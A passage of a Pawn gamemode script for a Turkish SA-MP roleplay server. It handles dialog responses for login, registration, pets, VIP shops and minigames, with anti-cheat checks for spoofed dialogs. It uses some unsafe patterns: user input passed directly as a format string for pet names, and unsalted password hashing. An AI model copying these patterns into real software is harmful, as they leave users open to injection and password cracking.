	PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY],
	PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX],
	PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);

    new stringg[856];
    format(stringg, sizeof(stringg), "Kemik (%s)\nPozisyon", HoldingBones[PlayerToyInfo[playerid][slotselection[playerid]][ptBone]]);
 	ShowPlayerDialogEx(playerid, EDITTOYS2, DIALOG_STYLE_LIST, "Oyuncak Menüsü: Ayarla", stringg, "Seç", "Iptal");
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[]) {
	new
	    string[128],
	    sendername[MAX_PLAYER_NAME];

	if(GetPVarInt(playerid, "dialog") != dialogid) { // Confirm the dialogid matches what we have in the PVar
		format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) is possibly trying to spoof a dialog ID (%d).", GetPlayerNameEx(playerid), playerid, dialogid);
  		ABroadCast(COLOR_YELLOW, string, 2);

		format(string, sizeof(string), "%s has possibly tried to spoof a dialog ID.", GetPlayerNameEx(playerid));
		AddAutomatedFlag(playerid, string);

		format(string, sizeof(string), "%s has possibly tried to spoof a dialog ID (%d, %d).", GetPlayerNameEx(playerid), dialogid, response);
		Log("logs/crash.log", string);

		return 1;
	}

	DeletePVar(playerid, "dialog"); // Delete the PVar now we're done with it

	if(!isnull(inputtext))
	{
	    if(strfind(inputtext, "%s", true) != -1)
	    {
			format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) is possibly dialog-exploiting by attempting to send a null string.", GetPlayerNameEx(playerid), playerid);
  			ABroadCast(COLOR_YELLOW, string, 2);

  			format(string, sizeof(string), "%s is possibly dialog-exploiting by attempting to send a null string.", GetPlayerNameEx(playerid));
  			AddAutomatedFlag(playerid, string);

  			format(string, sizeof(string), "%s has attempted to insert a false string placeholder into a dialog.", GetPlayerNameEx(playerid));
  			Log("logs/crash.log", string);
  			Kick(playerid);
	        return 1;
		}
	}
	if(dialogid == MAINMENU || dialogid == MAINMENU2) {
		if(dialogid == MAINMENU) {
			if(response == 0) {
				SendClientMessage(playerid, COLOR_CYAN, "Otomatik olarak kicklendin.");
				Kick(playerid);
			}
			else {
				if(strlen(inputtext)) {
					new passbuffer[129], name[MAX_PLAYER_NAME];
					GetPlayerName(playerid, name, sizeof(name));
					WP_Hash(passbuffer, sizeof(passbuffer), inputtext);
					AttemptPlayerLogin(playerid, passbuffer);

					strcpy(AdminRelogPassword[playerid], passbuffer, 129);
    			}
				else
				{
					new titlestring[64], dstring[512];
					format(titlestring, sizeof(titlestring), "{00ECFF}Phoenix Role Play - Giriþ yap");
					format(dstring, sizeof(dstring), "{FFFFFF}Yanlýþ þifre.\n\n{FFFFFF}Bu isim kayýtlý. Lütfen þifrenizi aþaðýya girin.\n\n{00ECFF}Kullanýcý Adý: {FFFFFF}%s\n\n {00ECFF}Þifre:", GetPlayerNameEx(playerid));
					ShowPlayerDialogEx(playerid,MAINMENU,DIALOG_STYLE_PASSWORD,titlestring,dstring,"Giriþ yap","Çýk");
					if(gPlayerLogTries[playerid] == 2) { SendClientMessage(playerid, COLOR_CYAN, "Yanlýþ þifre, otomatik olarak kicklendin."); Kick(playerid); }
				}
			}
		}
		if(dialogid == MAINMENU2)
		{
			if(response == 0)
			{
				SendClientMessage(playerid, COLOR_CYAN, "Otomatik olarak kicklendin.");
                //geberTimer(GetPVarInt(playerid, "MenuTimer"));
				Kick(playerid);
			}
			else if(strlen(inputtext))
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new passbuffer[129];
				WP_Hash(passbuffer, sizeof(passbuffer), inputtext);
				OnPlayerRegister(playerid,passbuffer);
			}
		}
	}
	else if(dialogid == REGISTRATION_MENU_ONE)
	{
	    if(response) {
	        PlayerInfo[playerid][pSex] = 1;
	        PlayerInfo[playerid][pSkin] = 299;
	    } else {
	        PlayerInfo[playerid][pSex] = 2;
	        PlayerInfo[playerid][pSkin] = 55;
	    }

	    ShowPlayerDialogEx(playerid, REGISTRATION_MENU_TWO, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}Karakterinizin yaþý kaç?\n\nNot: 18 ile 90 arasýnda bir yaþ seçiniz.", "Tamam", "");
	}
	else if(dialogid == REGISTRATION_MENU_TWO)
	{
		if(!IsNumeric(inputtext))
		{
			ShowPlayerDialogEx(playerid, REGISTRATION_MENU_TWO, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}GÝRÝÞ REDDEDÝLDÝ: You must enter a number!\n\nKarakterinizin yaþýnýn kaç olmasýný istiyorsunuz?\n\nUyarý: Yaþ 18'den büyük, 90'dan küçük olmalýdýr.", "Bitir", "");
			return 1;
		}
		new age = strval(inputtext);
		if(age < 18 || age > 90)
		{
			ShowPlayerDialogEx(playerid, REGISTRATION_MENU_TWO, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}GÝRÝÞ REDDEDÝLDÝ: Karakterinizin yaþý 18 ile 90 arasý olmalýdýr.\n\nKarakterinizin yaþýnýn kaç olmasýný istiyorsunuz?\n\nUyarý: Yaþ 18'den büyük, 90'dan küçük olmalýdýr.", "Bitir", "");
			return 1;
		}

		PlayerInfo[playerid][pAge] = age;
		SetPlayerVirtualWorld(playerid, 0);

		ShowPlayerDialogEx(playerid, REGISTRATION_MENU_THREE, DIALOG_STYLE_MSGBOX, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}Bu sunucuyu baþka bir oyuncumuzun önerisiylemi buldunuz?" , "Evet", "Hayýr");
  	}
	else if(dialogid == 3652) {
		if(!response)
		    return 1;

		switch(listitem) {
			case 0: {
			    // Paintball is static right now; I may change this in the future. Each arena has its own static ID, DM goes from 1-3, TDM goes from 4-6
			    ShowPlayerDialogEx(playerid, 3653, DIALOG_STYLE_LIST, "Paintball - DM", "LV Deposu\nRasgele Depo\nRC Savaþ alaný", "Git", "Iptal");
			}
			case 1: {
			    // Paintball is static right now; I may change this in the future. Each arena has its own static ID, DM goes from 1-3, TDM goes from 4-6
			    ShowPlayerDialogEx(playerid, 3654, DIALOG_STYLE_LIST, "Paintball - TDM", "LV Deposu\nRasgele Depo\nRC Savaþ alaný", "Git", "Iptal");
			}
			case 2: {
			    new
			        iPlayer = INVALID_PLAYER_ID;

			    foreach(Player, i) {
					if(GetPVarInt(i, "PBM") > 0) {
					    iPlayer = i; // always going to get the highest ID because Y_Less never added a 'break;' for foreach ~_~ ...or didn't document it
					}
			    }

			    if(iPlayer == INVALID_PLAYER_ID)
			        return SendClientMessage(playerid, COLOR_GREY, "Üzgünüz, þu anda oyunda kimse yok.");

			    JoinPaintballGame(playerid, GetPVarInt(iPlayer, "PBM"));
			}
		}
	}
	if(dialogid == PET)
	{
		if(response)
		{
		    switch(listitem)
		    {
		        case 0: ShowPlayerDialogEx(playerid, PET2, DIALOG_STYLE_INPUT, "Pet Sistemi", "Pet adý girin:", "Tamam", "Geri");
		        case 2:
		        {
		            if(PlayerInfo[playerid][pPetAdi] < 3) return SendClientMessage(playerid, -1, "{FF0000}[!] Pet adý belirlenmemiþ.");
		            if(!PlayerInfo[playerid][pPetTuru]) return SendClientMessage(playerid, -1, "{FF0000}[!] Pet cinsi belirlenmemiþ.");
		            if(PlayerInfo[playerid][pPetKontrol]) return SendClientMessage(playerid, -1, "{FF0000}[!] Pet kontrolünde pet çaðýramazsýnýz.");
					new str[128], saglikdurumu[128];
					new Float:x, Float:z, Float:y, Float:a, Float:kx, Float:kz, Float:ky;

					GetPlayerPos(playerid, x, y, z);
					GetPlayerFacingAngle(playerid, a);

					DestroyActor(OyuncuKopegi[playerid]);
				    DestroyDynamic3DTextLabel(PetText[playerid]);

					OyuncuKopegi[playerid] = CreateActor(PlayerInfo[playerid][pPetTuru], x, y+1, z, a);

					GetActorPos(OyuncuKopegi[playerid], kx, ky, kz);

				 	if(PlayerInfo[playerid][pPetCani] < 30) format(saglikdurumu, sizeof(saglikdurumu), "{FF0000}Yaralý{FFFFFF}");
					else if(PlayerInfo[playerid][pPetCani] < 50) format(saglikdurumu, sizeof(saglikdurumu), "{FFA500}Hasta{FFFFFF}");
					else if(PlayerInfo[playerid][pPetCani] <= 100 || PlayerInfo[playerid][pPetCani] > 100) format(saglikdurumu, sizeof(saglikdurumu), "{00FF00}Saðlýklý{FFFFFF}");

					format(str, sizeof(str), "{FFFFFF}[ {FF0000}%s {FFFFFF}]\n\n%s", PlayerInfo[playerid][pPetAdi], saglikdurumu);
					PetText[playerid] = CreateDynamic3DTextLabel(str,COLOR_DBLUE,kx,ky,kz+0.6,40.0);
		        }
		        case 3:
		        {
		            if(PlayerInfo[playerid][pPetCani] >= 95) return SendClientMessage(playerid, -1, "{FF0000}[!] Pet aç deðil!");
		            new Float:kx, Float:kz, Float:ky, str[128], saglikdurumu[128];
		            GetActorPos(OyuncuKopegi[playerid], kx, ky, kz);
				 	if(PlayerInfo[playerid][pPetCani] < 30) format(saglikdurumu, sizeof(saglikdurumu), "{FF0000}Yaralý{FFFFFF}");
					else if(PlayerInfo[playerid][pPetCani] < 50) format(saglikdurumu, sizeof(saglikdurumu), "{FFA500}Hasta{FFFFFF}");
					else if(PlayerInfo[playerid][pPetCani] <= 100 || PlayerInfo[playerid][pPetCani] > 100) format(saglikdurumu, sizeof(saglikdurumu), "{00FF00}Saðlýklý{FFFFFF}");
                    DestroyDynamic3DTextLabel(PetText[playerid]);
					format(str, sizeof(str), "{FFFFFF}[ {FF0000}%s {FFFFFF}]\n\n%s", PlayerInfo[playerid][pPetAdi], saglikdurumu);
		            PetText[playerid] = CreateDynamic3DTextLabel(str,COLOR_DBLUE,kx,ky,kz+0.6,40.0);
		            PlayerInfo[playerid][pPetCani] += 30;
		        }
		        case 4:
		        {
		            if(PlayerInfo[playerid][pPetKontrol] == 0)
		            {
		                PlayerInfo[playerid][pPetKontrol] = 1;
	                    DestroyActor(OyuncuKopegi[playerid]);
					    DestroyDynamic3DTextLabel(PetText[playerid]);
					    SetPVarInt(playerid, "skinnn", GetPlayerSkin(playerid));
						SetPlayerSkin(playerid, PlayerInfo[playerid][pPetTuru]);
					}
					else if(PlayerInfo[playerid][pPetKontrol] == 1)
					{
					    PlayerInfo[playerid][pPetKontrol] = 0;
						new skin = GetPVarInt(playerid, "skinnn"), saglikdurumu[256];
						SetPlayerSkin(playerid, skin);

						new str[128], Float:x, Float:z, Float:y, Float:a, Float:kx, Float:kz, Float:ky;

						GetPlayerPos(playerid, x, y, z);
						GetPlayerFacingAngle(playerid, a);
						OyuncuKopegi[playerid] = CreateActor(PlayerInfo[playerid][pPetTuru], x, y+1, z, a);

						GetActorPos(OyuncuKopegi[playerid], kx, ky, kz);
					 	if(PlayerInfo[playerid][pPetCani] < 30) format(saglikdurumu, sizeof(saglikdurumu), "{FF0000}Yaralý{FFFFFF}");
						else if(PlayerInfo[playerid][pPetCani] < 50) format(saglikdurumu, sizeof(saglikdurumu), "{FFA500}Hasta{FFFFFF}");
						else if(PlayerInfo[playerid][pPetCani] <= 100 || PlayerInfo[playerid][pPetCani] > 100) format(saglikdurumu, sizeof(saglikdurumu), "{00FF00}Saðlýklý{FFFFFF}");

						format(str, sizeof(str), "{FFFFFF}[ {FF0000}%s {FFFFFF}]\n\n%s", PlayerInfo[playerid][pPetAdi], saglikdurumu);
			            PetText[playerid] = CreateDynamic3DTextLabel(str,COLOR_DBLUE,kx,ky,kz+0.6,40.0);
					}
		        }
				case 5:
				{
					ShowPlayerDialogEx(playerid, PET3, DIALOG_STYLE_LIST, "Pet Türü", "Siyah Pitbull\nBoxer\nBull Terrier\nBeyaz Pitbull", "Seç", "Geri");
				}
		    }
		}
	    return 1;
	}
	if(dialogid == PET2)
	{
		if(response)
		{
		    format(PlayerInfo[playerid][pPetAdi], 32, inputtext);
		}
	    return 1;
	}
	if(dialogid == PET3)
	{
		if(response)
		{
		    switch(listitem)
		    {
			    case 0: PlayerInfo[playerid][pPetTuru] = 20013;
			    case 1: PlayerInfo[playerid][pPetTuru] = 20014;
			    case 2: PlayerInfo[playerid][pPetTuru] = 20015;
			    case 3: PlayerInfo[playerid][pPetTuru] = 20016;
   			}
		}
	    return 1;
	}
	else if(dialogid == vdolap) {
         if(response){
	        switch(listitem)
	        {
		        case 0:{
					SetPlayerHealth(playerid,99);
					format(string, sizeof(string), "Ücretsiz  Canýný doldurdun.");
					SendClientMessage(playerid,COLOR_ORANGE,string);
			    }
			    case 1:{
                    GivePlayerCash(playerid, -10000);
					SetPlayerArmourEx(playerid,99);
					format(string, sizeof(string), "10000 dolar karþýlýðýnda zýrhýný doldurdun.");
					SendClientMessage(playerid,COLOR_ORANGE,string);
 					}

			    case 2:{//silahlar
				ShowPlayerDialogEx(playerid, vdolap1, DIALOG_STYLE_LIST, "VIP Silah Maðazasý", "AK-47(2000$)\nRifle(1000$)\nShotgun(500$)\nDesert Eagle(2000$)\nMP5(750$)\nM4 (2000$)\nCombat Shotgun (5000$)\nSniper (5000$)", "Sec", "Iptal");
				}
			    case 3:{
                ShowPlayerDialogEx(playerid, vdolap2, DIALOG_STYLE_INPUT, "VIP Kiyafet Deðiþimi"," 0 ile 311 Skin idleri arasýndan skin giriniz", "Sec", "Iptal");
				}
          		case 4: {
          		if(PlayerInfo[playerid][pDonator] >= 2)
          		{
					ShowPlayerDialogEx(playerid,vdolap3, DIALOG_STYLE_LIST, "VIP Meslek Seçimi", "-Dedektiflik Meslegi\n-Avukat Meslegi\n-Hayat Kadýný Meslegi\n-Tamirci Meslegi\n-BodyGuard Meslegi\n-Silah Satýcýsý Meslegi\n-Boksör\n-Uyuþturucu Kaçakcýsý Meslegi\n-Zanaatkar\n-Barmen\n-Kamyon Þöförü\n-Pizzacý", "Sec", "Iptal");
 				}
 				else
 				{
 				    SendClientMessage(playerid, -1, "Meslek menüsünü görebilmek için Safir VÝP yada Elmas VÝP olmanýz gerekiyor.");
                }
				}
                case 5: {
		            if(GetPlayerColor(playerid) != TRANSPARENT_VIP) {SetPlayerColor(playerid, TRANSPARENT_VIP); SendClientMessage(playerid, COLOR_VIP, "VIP Ad rengini etkinleþtirdin.");}
		            else {SetPlayerColor(playerid, TEAM_HIT_COLOR); SendClientMessage(playerid, COLOR_VIP, "VIP ad rengini kapattýn.");}
		        }
			}
		}
	}
    else if(dialogid == vdolap1)
	{
	    if(response)
	    {   new str[128];
		    new silahid,bilet;
 	        switch(listitem)
	        {
				case 0: { silahid = 30; bilet = 2000;}
				case 1: { silahid = 33; bilet = 1000;}
				case 2: { silahid = 25; bilet = 500;}
				case 3: { silahid = 24; bilet = 2000;}
				case 4: { silahid = 29; bilet = 750;}
				case 5: { silahid = 31; bilet = 2000;}
				case 6: { silahid = 27; bilet = 7000;}
				case 7: { silahid = 34; bilet = 5000;}
			}
			GivePlayerValidWeapon(playerid, silahid, 60000);
			GivePlayerCash(playerid, -bilet);
			format(str, sizeof(str), "* %s VIP dolabýndan %d $ karþýlýðýnda ekipman alýr.", GetPlayerNameEx(playerid), bilet);
			ProxDetector(30.0, playerid, str, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	    }
	}
	else if(dialogid == vdolap2)
	{
	    if(response)
	    {   new str[128];
	        new skinid = strval(inputtext);
	        if(skinid < 0 || skinid > 311) return SendClientMessage(playerid, COLOR_GREY, "Skinler 0 ile 311 arasýndadýr.");
	        format(str, sizeof(str), "* %s VIP dolabýndan ücretsiz olarak kýyafet alýr.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, str, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	        SetPlayerSkin(playerid, skinid);
	        PlayerInfo[playerid][pSkin] = skinid;
	    }
	}
	else if(dialogid == vdolap3) {
		if(response)
 		{
			 switch(listitem) {
					case 0 : VIPisci[playerid] = 1;
					case 1 : VIPisci[playerid] = 2;//avukat
					case 2 : VIPisci[playerid] = 3;
					//case 3 : VIPisci[playerid] = 4;
					case 3 : VIPisci[playerid] = 7;
					case 4 : VIPisci[playerid] = 8;
					case 5 : VIPisci[playerid] = 9;
					case 6 : VIPisci[playerid] = 12;
					case 7 : VIPisci[playerid] = 14;
					//case 9 : VIPisci[playerid] = 17;
					case 8 :VIPisci[playerid] = 18;
					case 9 :VIPisci[playerid] = 19;
					case 10 :VIPisci[playerid] = 20;
					case 11 :VIPisci[playerid] = 21;
			 }
			 ShowPlayerDialogEx(playerid,vdolap4, DIALOG_STYLE_LIST,"VIP Meslek Seçimi","1. Meslek\n2. Meslek","Seç","Ýptal");
		}
	}
    else if(dialogid == vdolap4) {
		new slot,istext[32];
		if(response)
			{
			switch(listitem){
				case 0:{
				slot = 1;
				PlayerInfo[playerid][pJob] = VIPisci[playerid];
				}
				case 1:{
				slot = 2;
				PlayerInfo[playerid][pJob2] = VIPisci[playerid];
				}
			}
			switch(VIPisci[playerid]) {
				case 1: istext = "Dedektif";
				case 2: istext = "Avukat";
				case 3: istext = "Hayat Kadýný";
				case 5: istext = "Araba Hýrsýzý";
				//case 6: istext = "News Reporter";
				case 7: istext = "Tamirci";
				case 8: istext = "Bodyguard";
				case 9: istext = "Silah Satýcýsý";
				//case 10: istext = "Car Dealer";
				case 12: istext = "Boksör";
				case 14: istext = "UyuþturucuKaçakçýsý";
				//case 15: istext = "Paper Boy";
				//case 16: istext = "Kamyon Þoförü";
				//case 17: istext = "Taksici";
				case 18: istext = "Zanaatkar";
				case 19: istext = "Barmen";
				case 20: istext = "Kamyon Þoförü";
				case 21: istext = "Pizzacý";
			}
			format(string,sizeof(string),"%d. meslek olarak %s mesleðini ayarladýn.",slot,istext);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	else if(dialogid == DIALOG_SAN_CLOTHES) {
		switch(listitem) {
			case 0: {
				PlayerInfo[playerid][pSkin] = 113;
				SetPlayerSkin(playerid, 113);
			}
			case 1: {
				PlayerInfo[playerid][pSkin] = 148;
				SetPlayerSkin(playerid, 148);
			}
		}

		return 1;
	}
	else if(dialogid == 3653) {
		if(!response)
		    return 1;

		SendClientMessage(playerid, COLOR_WHITE, "Ölümoyunu oynamaya hazýrlanýyorsun.");
		SendClientMessage(playerid, COLOR_GREY, "Görev, tek olarak öldürebildiðin kadar adam öldürmek.");

	    switch(listitem) {
	    	case 0: JoinPaintballGame(playerid, 1);
	    	case 1: JoinPaintballGame(playerid, 2);
	    	case 2: JoinPaintballGame(playerid, 3);
	    }
	}
	else if(dialogid == 3654) {
		if(!response)
		    return 1;

 		SendClientMessage(playerid, COLOR_WHITE, "Takým Ölümoyunu oynamaya hazýrlanýyorsun.");
		SendClientMessage(playerid, COLOR_GREY, "Görev, takým olarak öldürebildiðin kadar adam öldürmek.");

	    switch(listitem) {
	    	case 0: JoinPaintballGame(playerid, 4);
	    	case 1: JoinPaintballGame(playerid, 5);
	    	case 2: JoinPaintballGame(playerid, 6);
	    }
	}

	#if defined TREASURE_HUNT_ENABLED
	if(dialogid == DIALOG_HUNT_PRIZE) {
	    if(!response) {
	        SetRandomHuntPos();
	        DeletePVar(playerid, "fT");
	        return 1;
		}

		switch(listitem) {
		    case 0: {
		        PlayerInfo[playerid][pPot] += 20;
  		      	PlayerInfo[playerid][pCrack] += 10;

        		format(string, sizeof(string), "%s ödül olarak 20 pot ve 10 crack seçti.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
		        SendClientMessage(playerid, COLOR_WHITE, "20 crack, 10 pot seçtin. Tebrikler, hakettin.");
		    }
		    case 1: {
				PlayerInfo[playerid][pMats] += 2000;

				format(string, sizeof(string), "%s ödül olarak 2.000 materyal seçti.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
				SendClientMessage(playerid, COLOR_WHITE, "2.000 materyal seçtin. Tebrikler, hakettin.");
			}
		    case 2: {
		        GivePlayerValidWeapon(playerid, 24, 50000);

  				format(string, sizeof(string), "%s ödül olarak Desert Eagle seçti.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
		        SendClientMessage(playerid, COLOR_WHITE, "Desert eagle seçtin. Tebrikler, hakettin.");
		    }
		    case 3: {
		        PlayerInfo[playerid][pRespect] += 1;

  				format(string, sizeof(string), "%s ödül olarak 1 saygý puanýný seçti.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
		        SendClientMessage(playerid, COLOR_WHITE, "1 saygý puaný seçtin. Tebrikler, hakettin.");
		    }
		}

		SetRandomHuntPos();
		DeletePVar(playerid, "fT");

		return 1;
	}
	else if(dialogid == DIALOG_HUNT_QUESTION) {
	    if(!response) {
	        SetRandomHuntPos();
	        DeletePVar(playerid, "fT");
	        return 1;
		}

	    switch(GetPVarInt(playerid, "HuntQ")) {
	        case 0: {
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 1: {
				if(listitem == 0) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 2: {
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 3: {
				if(listitem == 1) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 4: {
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 5: {
				if(listitem == 1) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 6: { // 0
				if(listitem == 0) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 7: { // 2
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 8: { // 0
				if(listitem == 0) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
			case 9: { // 1
				if(listitem == 1) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "Yanlýþ cevap verdin. Hediyenin yeri deðiþti! Birdahaki sefere bol þans!");
					DeletePVar(playerid, "fT");
				}
			}
	    }
	}
	#endif

  	if(dialogid == REGISTRATION_MENU_THREE)
  	{
   		if(response)
	    {
	        ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}Bu oyunu sana öneren kiþinin adý nedir?\n\nUyarý: Oyuncunun tam ismini girmek zorundasýn. Ýsim ve soyisminin arasýna ('_') koymayý unutma. Örn: John_Smith", "Bitir", "Iptal");
	    }
  	    else
  	    {
			HideMainMenuGUI(playerid);
			PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //muzik Off

			SetPlayerPos(playerid, 2212.61, -1730.57, -80.0);
			SetPlayerCameraPos(playerid, 2208.67, -1733.71, 27.48);
			SetPlayerCameraLookAt(playerid, 2225.25, -1723.1, 13.56);
			TogglePlayerControllable(playerid, false);
			SetPVarInt(playerid, "IsFrozen", 1);

			for(new t = 0; t < 11; t++)
			{
				TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
			}

			TutorialProgress[playerid] = 1;

			SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
		}
	}
	else if(dialogid == REGISTRATION_MENU_FOUR)
  	{
        if(response) {
            if(IsNumeric(inputtext)) {
                ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}GÝRÝÞ REDDEDÝLDÝ: Girilen þey sayý olamaz.\n\nBu oyunu sana öneren kiþinin adý nedir?\n\nUyarý: Oyuncunun tam ismini girmek zorundasýn. Ýsim ve soyisminin arasýna ('_') koymayý unutma. Örn: John_Smith", "Bitir", "Iptal");
                return 1;
            }
            for(new i = 0; i < strlen(inputtext); i++) {
                if(inputtext[i] == ' ') {
                    ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}GÝRÝÞ REDDEDÝLDÝ: Lütfen isminden sonra boþluk yerine '_' (altçizgi) kullan.\n\nBu oyunu sana öneren kiþinin adý nedir?\n\nUyarý: Oyuncunun tam ismini girmek zorundasýn. Ýsim ve soyisminin arasýna ('_') koymayý unutma. Örn: John_Smith", "Bitir", "Iptal");
                    return 1;
                }
            }
            if(strfind(inputtext, "_", true) == -1) {
                ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}GÝRÝÞ REDDEDÝLDÝ: Lütfen isminizi seçerken doðru formatý kullanýn: Ýsim_Soyisim.\n\nBu oyunu sana öneren kiþinin adý nedir?\n\nUyarý: Oyuncunun tam ismini girmek zorundasýn. Ýsim ve soyisminin arasýna ('_') koymayý unutma. Örn: John_Smith", "Bitir", "Iptal");
                return 1;
            }
            if(strlen(inputtext) > 20) {
                ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}GÝRÝÞ REDDEDÝLDÝ: Ýsmin maksimum 20 karakterden oluþabilir.\n\nBu oyunu sana öneren kiþinin adý nedir?\n\nUyarý: Oyuncunun tam ismini girmek zorundasýn. Ýsim ve soyisminin arasýna ('_') koymayý unutma. Örn: John_Smith", "Bitir", "Iptal");
                return 1;
            }

            new
                szPlayerName[MAX_PLAYER_NAME],
                szQuery[128];

			mysql_real_escape_string(inputtext, szPlayerName, g_MySQLConnections[0]);

			format(PlayerInfo[playerid][pReferredBy], MAX_PLAYER_NAME, "%s", szPlayerName);

			format(szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szPlayerName);
			mysql_query(szQuery, THREAD_REFERRAL_MENU, playerid, g_MySQLConnections[0]);
        }
        else
        {
            strcpy(PlayerInfo[playerid][pReferredBy], "0", 32);
			HideMainMenuGUI(playerid);
			PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //muzik Off

			SetPlayerPos(playerid, 2212.61, -1730.57, -80.0);
			SetPlayerCameraPos(playerid, 2208.67, -1733.71, 27.48);
			SetPlayerCameraLookAt(playerid, 2225.25, -1723.1, 13.56);
			TogglePlayerControllable(playerid,0);

			for(new t = 0; t < 11; t++)
			{
				TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
			}

			TutorialProgress[playerid] = 1;

			SetTimerEx("TutorialProgression", 0, 0, "d", playerid);
        }
  	}
  	else if(dialogid == REGISTRATION_MENU_FIVE)
  	{
   		if(response)
	    {
  			HideMainMenuGUI(playerid);
			PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //muzik Off

			SetPlayerPos(playerid, 2212.61, -1730.57, -80.0);
			SetPlayerCameraPos(playerid, 2208.67, -1733.71, 27.48);
			SetPlayerCameraLookAt(playerid, 2225.25, -1723.1, 13.56);
			TogglePlayerControllable(playerid,0);

			for(new t = 0; t < 11; t++)
			{
				TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
			}

			TutorialProgress[playerid] = 1;

			SetTimerEx("TutorialProgression", 0, 0, "d", playerid);

	    }
  	    else
  	    {
  	    	ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{00ECFF}Phoenix Role Play - Kayýt", "{FFFFFF}Size oyunu tavsiye eden kiþi kim?\n\nUyarý: Ad_Soyad þeklinde belirtmeniz gerekiyor. Örnek: John_Smith", "Tamam", "Iptal");
		}
	}
	else if(dialogid == 12768)
	{
		if(response)
	    {
